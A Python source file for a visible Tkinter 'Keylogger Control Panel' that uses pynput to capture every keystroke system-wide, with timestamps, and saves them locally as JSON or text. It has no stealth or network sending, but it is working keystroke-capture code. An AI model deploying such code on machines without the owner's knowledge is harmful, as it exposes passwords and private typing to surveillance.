import tkinter as tk
from tkinter import ttk, messagebox
import json
import threading
from pynput import keyboard
from datetime import datetime

class KeyloggerApp:
    def __init__(self, root):
        self.root = root
        self.root.title("Keylogger Control Panel")
        self.root.geometry("400x250")
        self.root.resizable(False, False)
        
        # --- CHANGE IS HERE ---
        # Set the background color of the main window to blue
        self.root.config(bg='blue')

        # --- Keylogger State ---
        self.listener = None
        self.log = []
        self.is_logging = False

        # --- GUI Elements ---
        self.create_widgets()

    def create_widgets(self):
        # Frame for buttons
        button_frame = ttk.Frame(self.root, padding="10")
        button_frame.pack(fill=tk.X)

        self.start_button = ttk.Button(button_frame, text="Start Logging", command=self.start_logging)
        self.start_button.pack(side=tk.LEFT, expand=True, fill=tk.X, padx=5)

        self.stop_button = ttk.Button(button_frame, text="Stop Logging", command=self.stop_logging, state=tk.DISABLED)
        self.stop_button.pack(side=tk.LEFT, expand=True, fill=tk.X, padx=5)

        # Separator
        ttk.Separator(self.root, orient=tk.HORIZONTAL).pack(fill=tk.X, pady=10)

        # Frame for file format selection
        format_frame = ttk.LabelFrame(self.root, text="Log File Format", padding="10")
        format_frame.pack(fill=tk.X, padx=10, pady=5)

        self.file_format = tk.StringVar(value="json")
        ttk.Radiobutton(format_frame, text="Save as JSON (.json)", variable=self.file_format, value="json").pack(anchor=tk.W)
        ttk.Radiobutton(format_frame, text="Save as Text (.txt)", variable=self.file_format, value="text").pack(anchor=tk.W)

        # Status Label
        self.status_label = ttk.Label(self.root, text="Status: Idle", font=("Helvetica", 10))
        self.status_label.pack(pady=10)

    def on_press(self, key):
        """Callback for when a key is pressed."""
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')
        try:
            key_char = key.char
            self.log.append({"event": "pressed", "key": key_char, "timestamp": timestamp})
        except AttributeError:
            self.log.append({"event": "pressed", "key": str(key), "timestamp": timestamp})

    def on_release(self, key):
        """Callback for when a key is released."""
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')
        self.log.append({"event": "released", "key": str(key), "timestamp": timestamp})

    def start_logging(self):
        """Starts the keylogger in a separate thread."""
        if self.is_logging:
            messagebox.showwarning("Warning", "Keylogger is already running!")
            return

        self.is_logging = True
        self.log = []  # Clear previous logs
        self.status_label.config(text="Status: Logging...", foreground="green")
        
        # Disable start button and enable stop button
        self.start_button.config(state=tk.DISABLED)
        self.stop_button.config(state=tk.NORMAL)

        # Start the listener in a new thread to avoid blocking the GUI
        self.listener = keyboard.Listener(on_press=self.on_press, on_release=self.on_release)
        self.listener_thread = threading.Thread(target=self.listener.start, daemon=True)
        self.listener_thread.start()

    def stop_logging(self):
        """Stops the keylogger and saves the log."""
        if not self.is_logging:
            messagebox.showwarning("Warning", "Keylogger is not running!")
            return

        self.is_logging = False
        self.status_label.config(text="Status: Stopping...", foreground="orange")
        
        # Stop the listener
        if self.listener:
            self.listener.stop()

        # Save the log file
        self.save_log()

        # Update GUI
        self.status_label.config(text="Status: Idle", foreground="black")
        self.start_button.config(state=tk.NORMAL)
        self.stop_button.config(state=tk.DISABLED)
        messagebox.showinfo("Success", f"Keylogger stopped. Log saved.")

    def save_log(self):
        """Saves the captured log to either a JSON or TXT file."""
        format_choice = self.file_format.get()
        if format_choice == "json":
            self.save_as_json()
        else:
            self.save_as_text()

    def save_as_json(self):
        """Saves the log as a formatted JSON file."""
        try:
            with open("keylog.json", "w") as f:
                json.dump(self.log, f, indent=4)
        except IOError as e:
            messagebox.showerror("Error", f"Failed to write JSON file: {e}")

    def save_as_text(self):
        """Saves the log as a human-readable text file."""
        try:
            with open("keylog.txt", "w") as f:
                for entry in self.log:
                    key_str = entry['key']
                    # Clean up special key names for readability
                    if key_str.startswith("Key."):
                        key_str = f"[{key_str.split('.')[1].upper()}]"
                    
                    if entry['event'] == 'pressed':
                        f.write(key_str)
        except IOError as e:
            messagebox.showerror("Error", f"Failed to write text file: {e}")

if __name__ == "__main__":
    root = tk.Tk()
    app = KeyloggerApp(root)
    root.mainloop()
